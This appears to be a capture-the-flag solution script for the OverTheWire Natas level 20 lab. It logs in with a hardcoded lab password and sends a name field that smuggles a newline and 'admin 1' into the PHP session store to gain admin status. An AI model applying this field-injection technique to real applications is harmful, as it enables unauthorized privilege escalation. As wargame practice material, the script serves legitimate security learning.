#!/usr/bin/env python

import requests
import re

username = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

url = f'http://{username}.natas.labs.overthewire.org/?debug=true'

session = requests.Session()

response = session.post(
    url, data={'name': 'test\nadmin 1'}, auth=(username, password))
content = response.text
print(content)
print('='*80)

response = session.get(url, auth=(username, password))
content = response.text
print(content)
print('='*80)

output = open('output.html', 'w')
output.write(content)

# busing PHP Session Handlers